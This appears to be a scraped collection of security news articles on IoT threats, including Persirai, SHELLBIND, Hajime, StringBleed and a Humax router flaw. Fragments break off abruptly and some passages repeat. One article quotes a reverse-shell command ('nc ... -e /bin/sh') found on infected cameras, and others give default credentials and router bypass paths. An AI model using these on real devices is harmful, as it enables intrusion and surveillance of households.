data locally, recording sessions, and as we have seen, become equipped with other sensors such as cameras and GPS location devices.  The fact that they are also connection to the Internet or to devices that are Internet connected raises the specter of both security and privacy issues.  The possibility that a public figure may be embarrassed is only one of a myriad of privacy concerns such as collection of mass surveillance information using these devices to track, monitor, and monetize through marketing.\n\nWhile at present unlikely, there is also a danger of physical harm since similar technology is already in a number of other devices such as Bluetooth hearing aids and medical devices.  Several recent research efforts have focused in on the danger posed by unsecure IOT devices and shown that they can be enabled to cause physical damage and even kill.\n\nWhile manufacturers could adopt a higher level of security \u2013 this will add to both the expense and complexity controlling such devices.  The Bluetooth naming convention could be altered to display a randomized string or mac address rather than the fixed name of \u201cLVS-Z001\u201d \u2013 thus solving the privacy issue of being detected by a wireless search.  In addition, the user could be required to program the device upon first use with a secure pin, thus disabling any attempt to hack it.\n\n\n\nManufacturers are unlikely to address these issues since they are viewed as \u201coverhead\u201d and not a prime concern.  In fact, as I noted, some makers may already be working with other large corporations to provide data mining on a scale never before imagined by marketing wizards.  It is therefore not in the interest to reduce potential monetization but instead maximizing it with no security nor privacy.\n\nThe challenges of security and privacy in the Internet connected world have gone from the office, to the factory, to the home even into the bedroom and beyond.  It is certain that the \u201cgiggle\u201d factor of involving sex will distract some from the real problems lurking behind the weak security attached to these devices.  The consumer and governmental watchdogs have yet to catch up to the risk posed to the general public.  It may be uncomfortable to ask questions and raise such issues but they must be addressed before someone gets hurt.\n\n\n\nCharles R.

"According to a new report from security provider Bitdefender, roughly 175,000 connected security cameras are vulnerable to cyber attacks.\n\nThe vulnerable cameras are manufactured by the Chinese company Shenzhen Neo Electronics that offers surveillance and security solutions, including IP cameras, sensors and alarms.\n\nThe experts discovered several buffer overflow vulnerabilities in two models of cameras manufactured by the company, the iDoorbell and the NIP-22 models.\n\n\n\nThe researchers believe that other models commercialized by the Chinese company are vulnerable because they use the same firmware.\n\n\u201cSeveral buffer overflow vulnerabilities (some before authentication) are present in the two cameras studied, the iDoorbell model and NIP-22 model, but we suspect that all cameras sold by the company use the same software and are thus vulnerable.\u201d reads the report published by BitDefender. \u201cThese vulnerabilities could allow, under certain conditions, remote code execution on the device. This type of\nvulnerabilities is also present on the gateway which controls the sensors and alarms.\u201d\n\nThe security cameras use UPnP (Universal Plug and Play) to automatically open ports in the router\u2019s firewall to allow the access from the Internet. Querying the Shodan search engine for vulnerable devices the researchers discovered between 100,000 and 140,000 vulnerable devices worldwide.\n\n\u201cInternet. We found between 100,000 and 140,000 devices when searching for the HTTP web server, and a similar number when searching for the RTSP server (both vulnerable). These are not necessarily the same devices, as some have only one service forwarded. We estimate that the real number of unique devices is around 175,000.\u201d continues the report.\n\nThe experts noticed that both security camera models are vulnerable to two different cyber attacks, one that affects the web server service running on cameras and another that affects the RSTP (Real Time Streaming Protocol) server.\n\nResearchers demomstrated that was quite easy to exploit the flaws in the security cameras, anyone can hack access the livestream by simply logging in with default credentials (i.e. \u201cuser,\u201d \u201cuser,\u201d and \u201cguest,\u201d \u201cguest\u201d).\n\nThe researchers also discovered a buffer overflow vulnerability that could be exploited to take control of the cameras remotely.\n\nShenzhen Neo did not comment the discovery.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 security cameras, IoT)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnet", "topic_name": "botnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercrime", "topic_name": "Cybercrime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-cameras", "topic_name": "Security Cameras"}]}, {"news_name": "SHELLBIND IoT malware targets NAS devices exploiting SambaCry flaw", "news_link": "https://securityaffairs.co/wordpress/61142/malware/shellbind-iot-malware.html", "title": "SHELLBIND IoT malware targets NAS devices exploiting SambaCry flaw\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 19, 2017", "body": "A new strain of malware dubbed SHELLBIND exploits the recently patched CVE-2017-7494 Samba vulnerability in attacks against Internet of Things devices.\n\nSHELLBIND has infected most network-attached storage (NAS) appliances, it exploits the Samba vulnerability (also known as SambaCry and EternalRed) to upload a shared library to a writable share, and then cause the server to load that library.\n\nThis trick allows a remote attacker to execute arbitrary code on the targeted system.\n\nCVE-2017-7494 is a seven-year-old remote code execution vulnerability that affects all versions of the Samba software since 3.5.0. The flaw has been patched by the development team of the project.\n\nThe CVE-2017-7494 flaw can be easily exploited, just a line of code could be used for the hack under specific conditions:\n\nThe Samba vulnerability affects the products of several major vendors, including NAS appliances.\n\nThe Samba bug appears to be a network wormable issue that could be exploited by a malicious code to self-replicate from vulnerable machine to vulnerable machine without requiring user interaction.\n\nWhen SambaCry was discovered, nearly 485,000 Samba-enabled computers were found to be exposed on the Internet.\n\nIn June, researchers at Kaspersky Lab set up honeypots to detect SambaCry attacks in the wild. The experts spotted a malware campaign that was exploiting the SambaCry vulnerability to infect Linux systems and install a cryptocurrency miner.\n\n\u201cOn May 30th our honeypots captured the first attack to make use of this particular vulnerability, but the payload in this exploit had nothing in common with the Trojan-Crypt that was EternalBlue and WannaCry. Surprisingly, it was a cryptocurrency mining utility!\u201d reported Kaspersky.\n\nThe independent security researcher Omri Ben Bassat\u200f also observed the same campaign that he dubbed \u201cEternalMiner.\u201d The expert confirmed threat actors started exploiting the SambaCry flaw just a week after its discovery to hijack Linux PCs and to install an upgraded version of \u201cCPUminer,\u201d a Monero miner.\n\nIn early July, experts at Trend Micro uncovered a new type of attack involving SambaCry. Crooks have been exploiting the flaw in attacks targeting NAS devices used by small and medium-size businesses. The malicious code was designed to compromise almost any IoT architecture, including MIPS, ARM, and PowerPC.\n\nThe attackers can easily find vulnerable devices using the Shodan Internet search engine then and write the malicious code to their public folders.\n\nExperts at Trend Micro discovered that the ELF_SHELLBIND.A is delivered as a SO file to Samba public folders, then the attacker load and execute it by exploiting the SambaCry vulnerability.\n\n\u201cThis more recent malware is detected as ELF_SHELLBIND.A and was found on July 3. Similar to the previous reports of SambaCry being used in the wild, it also opens a command shell on the target system. But ELF_SHELLBIND.A has marked differences that separate it from the earlier malware leveraging SambaCry. For one, it targets internet of things (IoT) devices\u2014particularly the Network Attached Storage (NAS) devices favored by small to medium businesses.\u201d reads the analysis published by Trend Micro. \u201cELF_SHELLBIND also targets different architectures, such as MIPS, ARM, and PowerPC. This is the first time we\u2019ve seen SambaCry being exploited without the cryptocurrency miner as a payload.\u201d\n\n\n\nOnce the malware is executed, it connects a C&C server located in East Africa \u201c169[.]239[.]128[.]123\u201d over TCP, port 80. , To establish a connection, the malicious code modifies firewall rules, then the attacker will open a command shell on the target system.\n\n\u201cOnce the connection is successfully established and authentication is confirmed, then the attacker will have an open command shell in the infected systems where he can issue any number of system commands and essentially take control of the device,\u201d continues Trend Micro.\n\nSysadmins can protect their systems by updating their installs, if it is not possible for any reason a workaround can be implemented by the adding the line\n\nto the Samba configuration file and restarting the network\u2019s SMB daemon.\n\nThe change will limit clients from accessing some network computers.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 CVE-2017-7494, SHELLBIND)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cve-2017-7494", "topic_name": "CVE-2017-7494"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/rce", "topic_name": "RCE"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/remote-code-execution-vulnerability", "topic_name": "Remote Code Execution Vulnerability"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/shellbind", "topic_name": "SHELLBIND"}]}, {"news_name": "Experts found an unpatched flaw in Humax WiFi Router model HG-100R", "news_link": "https://securityaffairs.co/wordpress/60838/hacking/humax-wifi-router-hg-100r-flaw.html", "title": "Experts found an unpatched flaw in Humax WiFi Router model HG-100R\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 9, 2017", "body": "A zero-day vulnerability in Humax WiFi Router model HG-100R could be exploited by attackers to compromise the WiFi credentials and obtain the router console administrative password. Trustwave SpiderLabs researchers discovered.\n\nThe issue was found by researchers at Trustwave SpiderLabs in May 2017, the company tried to report it to the manufacturer that did reply. the researchers say. The Humax WiFi Router model HG-100R is a default brand/version distributed by a major Internet provider in Brazil, it is also used in many other countries worldwide.\n\n\u201cMore recently, in May 2017, Felipe Cerqueira and Thiago Musa, both from Trustwave SpiderLabs, have found a remote vulnerability in the HUMAX WiFi Router model HG-100R*. This vulnerability can allow attackers to compromise the WiFi Credentials and, even more dangerous, to retrieve the router console administrative password.\u201d states the blog post published by Trustwave SpiderLabs.\u201dThe equipment is a default brand/version distributed by a major Internet provider in Brazil (where the vulnerability was discovered) but is also used in many other parts of the world.\u201d\n\nThe issue is simple to exploit, the attackers just need to send specially crafted requests to the management console to bypass authentication. The experts discovered the router fails to validate the session token while returning answers for some methods in \u201curl/api\u201d.\n\nThe exploitation of the flaw could allow an attacker to retrieve sensitive information, such as the private/public IP addresses, SSID names, and passwords.\n\n\u201cThe cookie login is basically json data containing uid and pwd encoded in base64: login={\u201cuid\u201d:\u201dadmin\u201d,\u201dpwd\u201d:\u201d4cd08a961f5c\u201d};,\u201d states the post. \u201cIn the example below you can see a request to the router without providing any authentication as well as the response containing sensitive data such as SSID name, IP addresses and WiFi password.\u201d\n\n\n\nA second vulnerability that affects the Humax WiFi Router model HG-100R allows attackers to bypass authentication to access the backup functionality. The feature allows router administrators to save and restore configuration, unfortunately, in both cases, the code fails to check cookies \u201clogin\u201d and \u201clogin_token.\u201d This implies that attacker can send requests to download and upload the full router configuration.\n\nAn attacker can change for example the DNS setting in order to hijack the user\u2019s traffic.\n\n\u201cBy using the backup generation/restore functionality provided by the URLs \u201c/view/basic/GatewaySettings.bin\u201d and \u201c/view/basic/ConfigUpload.html\u201d we were able to retrieve, change and finally restore a specially crafted configuration. As an example of the danger of this type of vulnerability, an attacker could use it to change your DNS configuration and redirect your traffic to servers controlled by them in order to steal private information such as passwords or banking account information.\u201d continues the analysis.\n\nThe experts also discovered that the GatewaySettings.bin file stores the administrative password in clear text. From byte 96, the file is encoded in base64, decoding it is possible to view the password for \u201cadmin\u201d (AAAAAAAA) and \u201croot\u201d (humax) users.\n\n\u201cIf your router allows remote configuration management via the Internet, attackers can easily gain access to it and change configurations that will impact your Internet traffic. However, even if configuration management is not available on the Internet facing interface, attackers can still exploit the vulnerability in locations where WiFi routers are public, for instance in a caf\u00e9 or airport,\u201d continues the blog post.\n\nTo protect your router, disable the option \u201cRemote Configuration Management.\u201d\n\n\u201cAccess your HUMAX WiFi Router via the following URL: http://192.168.0.1 and you should be able to find the credentials on the bottom of the router itself. By default, this configuration is not enabled, but you should double check it to make sure. If you don\u2019t have access to your router, try to contact your Internet Service Provider and ask for support or, perhaps, a new router,\u201d Trustwave concludes.\n\nPierluigi Paganini \n\n(Security Affairs \u2013 Humax WiFi Router model HG-100R, hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/humax-wifi-router-model-hg-100r", "topic_name": "Humax WiFi Router model HG-100R"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}]}, {"news_name": "Rapid7 report millions of endpoints exposed via SMB, Telnet Ports", "news_link": "https://securityaffairs.co/wordpress/60141/hacking/smb-endpoint-exposed.html", "title": "Rapid7 report millions of endpoints exposed via SMB, Telnet Ports\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 16, 2017", "body": "Rapid7 published the second report National Exposure Index that provides Internet service providers (ISPs) worldwide information about the global exposure of devices.\n\n\n\nThe researchers scanned the Internet for improperly configured services, such as the recently exploited Server Message Block (SMB) and Telnet that were respectively targeted in the WannaCry attack and attacks based on IoT botnets (i.e. Mirai, Persirai).\n\nThe experts counted 5.5 million machines with SMB port exposed, the data is alarming considering that prior May 2017, when WannaCry spread, the number of exposed devices was 4.7 million.\n\nAccording to Rapid7, 800,000 of endpoints exposing Microsoft file-sharing services (SMB, TCP port 445) are Windows systems.\n\n\u201cOver 1 million endpoints were confirmed exposing Microsoft file-sharing services (SMB, TCP port 445), with 800,000 of them being confirmed Windows systems, spanning virtually the entire product and release version lineage of the company.\u201d states the report. \u201c\u201cThis made for a target-rich environment for WannaCry, a \u201cransomworm\u201d that spreads in part through an SMB exploit made public in May of 2017.

Blocking port 445 would mitigate potential threats like this\u201d\n\nThe analysis of devices with exposed telnet (port 23) revealed roughly 10 million devices exposed to attacks. In this case, the number of exposed devices is decreased from the 14.8 million exposed devices discovered last year, anyway the situation is still alarming.\n\n\u201cPort scanning for telnet (port 23) in 2017 returned just under 10 million responsive nodes, compared to 2016\u2019s scan results of over 14.8 million.

The new Internet of Things (IOT) attack called ELF_PERSIRAI has also been back-tracked to an Iranian research institute which restricts its use to Iranians only, indicating a possible state-sponsored cyber strike by Tehran.\n\n\u201cC&C (Command and Control) servers we discovered were found to be using the .IR country code. This specific country code is managed by an Iranian research institute which restricts it to Iranians only. We also found some special Persian characters which the malware author used,\u201d stated Trend Micro in its discovery release posted online.\n\nIP Camera users have also encountered the malware attack and noted its point of origin appears to be Iran.\n\nThe Persirai attack is disturbing on a number of fronts.  It\u2019s based on the open-source Mirai strike shows that the freely available source code will be modified by attackers to strike again in different forms.  Persirai is also very stealthy, leaving most camera owners unaware that their systems are infected.\n\nYet, the worst feature is that the command and control computers used to run the malicious bot-net are using the country code of IR or Iran.  Infected IP cameras report to command servers at:\n\nThe Persirai attack installs itself and then deletes the installation files to hide its presence on the target camera, running in memory only.  It then proceeds to download and install additional control software and blocking software.  Once communications are established with the command and control network server, the infected camera is then ordered to search for other cameras and infect them as well.\n\n\n\nPersirai blocks other zero-day exploits from gaining access to a targeted IP Camera by pointing ftpupdate.sh and ftpupload.sh to /dev/null, preventing other attacks.  This feature may be an effort to prevent duplicate attacks by Persirai as much as to prevent other bot-net attackers from gaining control of the now captured IP Camera. The fact that Persirai is running in memory does mean it is also eliminated once the IP Camera is rebooted but, unless the user takes counter-measures, the targeted system will still be vulnerable to the exploit.\n\nThe Persirai attack is based on the previously successful Mirai IOT strike against IP cameras that was used to disrupt the Internet with a giant Denial of Service (DOS) attack in 2016.  However, while over 120,000 IP camera systems appear to be infected, over 30% of the Persirai targets are inside China with only small fraction located outside of the PRC; in Italy (3%), the UK (3%) and the USA (8%).\n\nTrend Micro provided data related to the impact and distribution of the Persirai botnet.\n\nThe researchers have determined that of a total of 4,403 IP cameras they counted in the United States, 51,37% have been infected with the backdoor, in Japan on a total of 661 cameras 64,85 percent have been infected.\n\n\n\nThe Persirai backdoor is not the only IoT malware targeting IP cameras, experts at Trend Micro are monitoring three other malware families: Mirai, DvrHelper, and TheMoon.\n\n\u201cA newer version of Mirai, DvrHelper (detected by Trend Micro as ELF_MIRAI.AU ) also learned from its predecessor. Since Mirai triggered such a response from companies and industries all over the world, DDoS prevention solutions have been surfacing. To match the increase in security, DvrHelper has eight more DDoS attack modules. It is also the first malware designed to bypass an anti-DDoS solution.\u201d states Trend Micro.\n\n\u201cFinally, TheMoon (detected by Trend Micro as ELF_THEMOON.B) is the oldest malware targeting IoT devices. The family was first discovered by SANS ICS in 2014 and it continues to upgrade attack methods and target new vulnerabilities.\u201d\n\n \n\nDvrHelper and TheMoon account for 6.8 percent and 1.4 percent of the infections detected by Trend Micro are in the U.S. and Japan, Taiwan and Korea.\n\nResearchers highlighted the \u201clock the door\u201d mechanisms implemented by these threats to avoid that other malware will infect the device they have compromised.\n\n\u201cWe find that there are four different malware families which all focus on IP cameras.

The new Internet of Things (IOT) attack called ELF_PERSIRAI has also been back-tracked to an Iranian research institute which restricts its use to Iranians only, indicating a possible state sponsored cyber strike by Tehran.\n\n\u201cC&C (Command and Control) servers we discovered were found to be using the .IR country code. This specific country code is managed by an Iranian research institute which restricts it to Iranians only. We also found some special Persian characters which the malware author used,\u201d stated Trend Micro in its discovery release posted online.\n\nIP Camera users have also encounter the malware attack and noted its point of origin appears to be Iran.\n\n\u201cHello found the following text on my 2 ip cameras (nc load.gtpnet.ir 1234 -e /bin/sh) and wondering who does that domain belong to? All I know is it is an iranian address nothing on whois. Ive obviously been hacked one of these cameras was in the kids room,\u201d stated one user in the Reddit hacking forum.\n\nThe attack is based on the previously successful Mirai IOT strike against IP cameras that was used to disrupt the Internet with a giant Denial of Service (DOS) attack in 2016.  However, while over 120,000 IP camera systems appear to be infected, over 30% of the Persirai targets are inside China with only small fraction located outside of the PRC; in Italy (3%), the UK (3%) and the USA (8%).\n\nThe Persirai attack is disturbing on a number of fronts.  Its base on the open-source Mirai strike shows that the freely available source code will be modified by attackers to strike again in different forms.  Persirai is also very stealthy, leaving most camera owners unaware that their systems are infected.\n\nYet, the worst feature is that the command and control computers used to run the malicious bot-net are using the country code of IR or Iran.  Infected IP cameras report to command servers at:\n\nThe Persirai attack installs itself and then deletes the installation files to hide its presence on the target camera, running in memory only.  It then proceeds to download and install additional control software and blocking software.  Once communications are established with the command and control network server, the infected camera is then ordered to search for other cameras and infect them as well.\n\n\n\nPersirai blocks other zero-day exploits from gaining access to a targeted IP Camera by pointing ftpupdate.sh and ftpupload.sh to /dev/null, preventing other attacks.  This feature may be an effort to prevent duplicate attacks by Persirai as much as to prevent other bot-net attackers from gaining control of the now captured IP Camera. The fact that Persirai is running in memory does mean it is also eliminated once the IP Camera is rebooted but, unless the user takes counter-measures, the targeted system will still be vulnerable to the exploit.\n\nWhile Trend Micro advises IP Camera users to use strong passwords, the Persirai attack is not dependent on a password attack, nor does it appear to steal passwords.  A better counter-measure is to disable Universal Plug and Play (UPnP) features on your router.  Universal Plug and Play (UPnP) is a network protocol that allows devices such as IP Cameras to open a port on the router and act like a server.  This feature also makes the attached devices highly visible targets for the Persirai malware attack.\n\nUsers can also simply remove their IP Camera systems from Internet access altogether and then set up a private VPN service to allow them to log into the cameras by remote.  Users are also advised to update their firmware on their IP Cameras and maintain a close inspection of any web address linked activity.\n\nThe Persirai attack is part of a new trend to strike at the Internet via devices not traditionally viewed as computers.  These malware strikes illustrate the issue of vendors selling hardware with little or no security.  There are no current regulations or standards for IOT device security.  Consumers are literally left on their own and frequently choose low cost systems which have no security features such as encryption or even manufacturer updates.\n\nWhile many IOT users are aware enough to update their computers and cell phones with the latest software and perform anti-virus checks, they are not aware that other devices such as cameras, washing machines, refrigerators and DVR recorders may also require security checks.  Even DVD players and smart TVs from major manufacturers are vulnerable to exploits as illustrated by the Wikileaks release of the WEEPING ANGEL attacks developed by the CIA in co-operation with the UK\u2019s GCHQ spy agency which attacked Samsung TVs.\n\nDetails from Trend Micro on Persirai:\n\nhttp://blog.trendmicro.com/trendlabs-security-intelligence/persirai-new-internet-things-iot-botnet-targets-ip-cameras/\n\nAbout the author: Charles R.

Click the chart for a larger version.\u201d\n\n\u201cAs you can see, starting at around midnight on Sunday night (April 30th) Pacific time, the number of attacks we are seeing from ISPs where we found vulnerable routers have dropped from peaks of 40,000 in some cases to peaks of just above 5,000 attacks per hour. In many cases the attacks drop to much lower levels and continue to decrease.\u201d\n\n\n\nThe root cause of this drop is still unclear, researchers at WordFence believe the situation will be more clear in the next week.\n\nA possible cause is that the attackers ended their operation for some reason, otherwise law enforcement along security firms have tracked the botnet and took down the command and control (C&C) servers.\n\nA few weeks ago,  US authorities announced have dismantled the infamous Kelihos botnet. In the same period, the Interpol located and shut down nearly 9,000 Command and control servers located in Asia and hacked with a WordPress plug-in exploit.\n\nThis reduction of WordPress attacks originating from hundreds of ISPs worldwide is a good news. The experts were able to track the WordPress attacks originating from these ISPs and ban IP addresses involved in the botnet.\n\n\u201cThe attacks originating from these ISPs were also resulting in their IP addresses being blacklisted by Wordfence and other services like SpamHaus. That resulted in the customers of those ISPs suffering because certain websites and services would block them.

The experts were searching for sysDescr OID information provided by the devices in response to requests using test strings like \u2018admin\u2019, \u2018root\u2019, and \u2018user.\u2019\n\nThe researchers were looking to retrieve the sysDescr OID information successfully when the test string value (\u2018admin\u2019, \u2018root\u2019, \u2018user, etc.) was the same as the one stored in the SNMP agent for authentication.\n\n\u201cWe wrote a simple python script from scratch using sockets in order to build the \u201csnmpget\u201d request, in the request we used the sysDescr OID , if the string value we are testing (admin,root etc etc) is the same stored in the SNMP agent for authentication , we are going to retrieve the sysDescr OID information successfully, is like a kind of \u201cbrute force\u201d. After some days of scanning we noticed something weird, some devices/fingerprints were always responding no matter which value we used, so what\u2019s going here??? researchers added.\n\nAs I mentioned before, the SNMP version 1 & 2 authentication should only accept the value stored in the SNMP agent authentication mechanism, but the behavior based in our results is not accurate like the statement explained previously.\u201d\n\nThe StringBleed vulnerability is an Incorrect Access Control issue, remote attackers could exploit the issue to execute code on the vulnerable devices and gain \u201cfull read/write remote permissions using any string/integer value.\u201d\n\n\u201cIn few words, we discovered the following: you can use any value string or integer in order to authenticate the SNMP agent successfully in some specific devices, but the worse thing here is : you have full read/write remote permissions using any string/integer value.\u201d said the researchers.\n\nThe results of the Internet Scan were disconcerting, an attacker could use any value string or integer to authenticate the SNMP agent on the flawed devices.\n\nThe experts discovered the but by testing the attack on the CISCO DPC3928SL wireless residential gateway, which is now owned by Technicolor.\n\n\n\nThe company confirmed the presence of the StringBleed bug on the device but clarified that it was only a \u201ccontrol misconfiguration issue\u201d and that it was isolated to a single Internet Service Provider (ISP).\n\nAccording to the experts, the issue is widespread and hackers could easily target exposed on the Internet.\n\nOne of the researchers revealed in a discussion on Reddit that 78 vulnerable models were found vulnerable to date to the StringBleed flaw.\n\nStay Tuned \u2026. the number of models could rapidly increase.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 StringBleed , hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/bypass-authentication-rce", "topic_name": "bypass authentication.

The threat targets unsecured IoT devices with open Telnet ports and still used default passwords. Researchers discovered Hajime uses the same list of username and password combinations that Mirai, plus two more.\n\nUnlike Mirai, Hajime doesn\u2019t use C&C servers, instead, it implements a peer-to-peer network.\n\n\u201cThere isn\u2019t a single C&C server address, instead the controller pushes command modules to the peer network and the message propagates to all the peers over time. This is typically considered a more robust design as it makes takedowns more difficult.\u201d reads the analysis published by Symantec. \n\nHajime is more sophisticated than Mirai, it implements more mechanisms to hide its activity and running processes. The threat has a modular structure allowing operators to add new capabilities on the fly.\n\nThe analysis of the Hajime reveals that it doesn\u2019t implement denial of service (DDoS) capabilities or any other attacking code. Symantec researchers noticed that Hajime fetches a statement from its controller and displays it on the terminal every 10 minutes. The message is:\n\nJust a white hat, securing some systems. Important messages will be signed like this!\nHajime Author.\nContact CLOSED\nStay sharp!\n\nThe message is digitally signed and the worm will only accept messages signed by a hardcoded key. Once infected a system, the worm blocks access to ports 23, 7547, 5555, and 5358, in order to prevent attacks from other IoT threats, including Mirai.\n\nExperts believe Hajime could be the work of a cyber vigilante, in the past we have observed similar codes like the Linux.Wifatch discovered by Symantec in October 2015.\n\nAccording to a research conducted by a new research conducted by Kaspersky Lab, the Hajime botnet continues to grow, it has already recruited up to 300,000 IoT devices.\n\nThe author of the Hajime is continuing to update the code, researchers at Kaspersky observed that he made recent changes in the attack module introducing the TR-069 exploitation. Currently, the bot implements three different attack methods: TR-069 exploitation, Telnet default password attack, and Arris cable modem password of the day attack.\n\n\u201cTechnical Report 069 is a standard published by the Broadband Forum, which is an industry organization defining standards used to manage broadband networks. Many ISPs and device manufacturers are members of the Broadband Forum. TR-069 allows ISPs to manage modems remotely. TCP port 7547 has been assigned to this protocol, but some devices appear to use port 5555 instead.\u201d reads the analysis published by Kaspersky.\n\n\u201cThe TR-069 NewNTPServer feature can be used to execute arbitrary commands on vulnerable devices.\u201d\n\nThe TR-069 attack was implemented last year when hackers compromised more than 900.000 routers of the from Deutsche Telekom.\n\nExperts at Kaspersky discovered that the Hajime botnet targets any device on the Internet with the exception of specific networks and devices. The author of the threat recently improved the detection logic of the malicious code.\n\n\u201cOnce the attack successfully passes the authentication stage, the first 52 bytes of the victim\u2019s echo binary are read. The first 20 bytes, which is the ELF header, hold information about the architecture, operating system and other fields. The victim\u2019s echo ELF header is then compared against a predefined array, containing the Hajime stub downloader binaries for different architectures.\u201d states Kaspersky. \u201cThis way the correct Hajime-downloader binary that works on the victim\u2019s machine, can be uploaded from the attacker (which is actually the infected device that started the attack).\u201d\n\nA honeypot set up by Kaspersky registered during a 24-hour period 2,593 successful telnet Hajime attacks. 2,540 of them originated from unique IP addresses, 949 of the hosts provided a payload, and 528 of them had an active web server running at port 80/tcp.\n\nMost attacks were powered by compromised devices located in Vietnam (20.04%), Taiwan (12.87%) and Brazil (8.94%).\n\n\n\n\u201cThe most intriguing thing about Hajime is its purpose. While the botnet is getting bigger and bigger, partly due to new exploitation modules, its purpose remains unknown. We haven\u2019t seen it being used in any type of attack or malicious activity. Nevertheless, we advise owners of IoT devices to change the password of their devices to one that\u2019s difficult to brute force and to update the firmware if possible,\u201d concluded Kaspersky.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Vigilante malware, Hajime botnet)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/hacking", "topic_name": "Hacking"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hajime", "topic_name": "Hajime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-2", "topic_name": "security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/vigilante-malware", "topic_name": "Vigilante malware"}]}, {"news_name": "WikiLeaks published the user guide for the CIA Weeping Angel, the Samsung Smart TV Hacking Tool", "news_link": "https://securityaffairs.co/wordpress/58210/intelligence/cia-weeping-angel-guide.html", "title": "WikiLeaks published the user guide for the CIA Weeping Angel, the Samsung Smart TV Hacking Tool\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 21, 2017", "body": "WikiLeaks has published a new document included in the Vault7 archive containing technical details about another hacking tool allegedly used by the U.S. Central Intelligence Agency (CIA).

The threat targets unsecured IoT devices with open Telnet ports and still used default passwords. Researchers discovered Hajime uses the same list of username and password combinations that Mirai, plus two more.\n\nUnlike Mirai, Hajime doesn\u2019t use C&C servers, instead, it implements a peer-to-peer network.\n\n\u201cThere isn\u2019t a single C&C server address, instead the controller pushes command modules to the peer network and the message propagates to all the peers over time. This is typically considered a more robust design as it makes takedowns more difficult.\u201d reads the analysis published by Symantec. \n\nHajime is more sophisticated than Mirai, it implements more mechanisms to hide its activity and running processes. The threat has a modular structure allowing operators to add new capabilities on the fly.\n\nThe analysis of the Hajime reveals that it doesn\u2019t implement denial of service (DDoS) capabilities or any other attacking code. Symantec researchers noticed that Hajime fetches a statement from its controller and displays it on the terminal every 10 minutes. The message is:\n\nJust a white hat, securing some systems. Important messages will be signed like this!\n\nHajime Author.\n\nContact CLOSED\n\nStay sharp!\n\nThe message is digitally signed and the worm will only accept messages signed by a hardcoded key. Once infected a system, the worm blocks access to ports 23, 7547, 5555, and 5358, in order to prevent attacks from other IoT threats, including Mirai.\n\nExperts believe Hajime could be the work of a cyber vigilante, in the past we have observed similar codes like the Linux.Wifatch discovered by Symantec in October 2015.\n\n\u201cThe problem with these white worms is that they usually turn out to have a short lifespan.

Most IPs were only launching between 50 and 1000 attacks during the entire month.\u201d\n\nThe hackers exploited vulnerabilities in the routers provided by Telecom Algeria to its customers, then compromised the devices to launch brute-force and other WordPress attacks.\n\nWordfence identified compromised routers from 27 ISPs worldwide involved in the WordPress attacks. The routers of more than a dozen of these ISPs are listening on port 7547 that is used by the ISPs for remote management purposes, the experts noticed that all the flawed devices are running a vulnerable version of the AllegroSoft RomPager web server.\n\nAll the RomPager versions prior to 4.34 are affected by a critical vulnerability tracked as CVE-2014-9222, also known as \u2018Misfortune Cookie\u2018.\n\n\n\nThe flaw was reported in December 2014 by researchers at Check Point Software Technologies who discovered that more than 12 Million Home Routers were affected by the issue.\n\nThe vulnerability could be exploited by an attacker to run a man-in-the-middle attack on traffic going to and from home routers from every manufacturer.\n\nOnce an attacker compromise a router, it could target any other devices on a local network, such as a smart TV or a printer.\n\nThe flaw can be exploited to hijack a large number of devices made by Huawei, Edimax, D-Link, TP-Link, ZTE, ZyXEL and other vendors.\n\nThe routers provided by 14 of the 28 ISPs are vulnerable to Misfortune Cookie attacks.\n\nAccording Wordfence, in just three days, 6.7 percent of all attacks aimed at protected WordPress websites came from home routers that have port 7547 open.\n\nLast month, Wordfence observed more than 90,000 unique IP addresses from the 28 ISPs associated with compromised routers, most of them generate less than 1,000 attacks over the course of up to 48 hours, after which they stop.\n\n\u201cIn just the past month we have seen over 90,000 unique IP addresses at 28 ISPs that fit our compromised-router attack pattern.

